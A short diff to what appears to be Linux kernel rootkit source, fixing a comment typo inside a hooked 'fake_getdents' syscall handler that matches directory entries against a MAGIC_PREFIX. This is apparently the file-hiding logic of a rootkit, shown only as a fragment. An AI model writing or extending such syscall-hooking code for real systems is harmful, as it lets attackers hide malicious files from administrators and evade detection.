@@ -60,7 +60,7 @@ asmlinkage long fake_getdents(struct pt_regs *regs)
 	while (i < bytes_read) {
 		d_reclen = dirent->d_reclen;
 		
-		/* chech matching with MAGIC_PREFIX */
+		/* check matching with MAGIC_PREFIX */
 		j = 0;
 		while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && 
 		       dirent->d_name[j] == MAGIC_PREFIX[j])
